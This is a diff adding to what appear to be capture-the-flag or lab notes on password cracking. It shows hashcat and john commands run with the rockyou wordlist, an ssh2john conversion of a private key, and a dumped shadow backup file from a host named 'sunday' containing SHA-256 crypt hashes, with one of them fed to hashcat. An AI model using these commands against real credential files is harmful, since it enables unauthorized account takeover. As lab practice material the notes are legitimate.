@@ -12,3 +12,23 @@ hashcat hash /usr/share/wordlists/rockyou.txt -m 0 --force
 /home/kali/tools/cracker/john/run/ssh2john.py id_rsa > id_rsa.hash
 
 john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
+
+
+
+```
+sunny@sunday:/backup$ cat shadow.backup
+mysql:NP:::::::
+openldap:*LK*:::::::
+webservd:*LK*:::::::
+postgres:NP:::::::
+svctag:*LK*:6445::::::
+nobody:*LK*:6445::::::
+noaccess:*LK*:6445::::::
+nobody4:*LK*:6445::::::
+sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
+
+cat hash.txt
+$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3
+hashcat -m 7400 hash.txt /usr/share/wordlists/rockyou.txt --force
+```
